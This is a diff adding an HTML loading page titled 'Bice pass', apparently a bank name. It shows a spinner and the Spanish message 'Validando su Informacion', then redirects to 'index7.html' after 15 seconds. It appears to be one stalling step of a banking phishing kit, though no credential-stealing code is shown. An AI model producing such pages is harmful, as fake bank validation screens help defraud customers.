@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Bice pass</title>
+    <style>
+        body {
+            margin-top: 100px;
+            background-color: #FFFFFF;
+            color: #fff;
+            text-align: center;
+        }
+
+        h1 {
+            font: 1.5em 'Roboto', sans-serif;
+            margin-bottom: 30px;
+        }
+
+        .spin {
+            display: inline-block;
+            width: 100px;
+            height: 100px;
+            border: 10px solid rgba(255, 255, 255, .3);
+            border-radius: 50%;
+            border-top-color: #007bff;
+            animation: spin 1s ease-in-out infinite;
+            -webkit-animation: spin 1s ease-in-out infinite;
+        }
+
+        @keyframes spin {
+            to {
+                -webkit-transform: rotate(360deg);
+            }
+        }
+
+        @-webkit-keyframes spin {
+            to {
+                -webkit-transform: rotate(360deg);
+            }
+        }
+    </style>
+</head>
+<body>
+<div class="spin"></div></br></br></br>
+<FONT COLOR="#010101"><h1>Validando su Informacion</h1></br></br></br>
+
+<script>
+    setTimeout(function(){
+        window.location.href = 'index7.html';
+    }, 15000); // 15 segundos de tiempo de espera antes de redirigir
+</script>
+
+</body>
+</html>
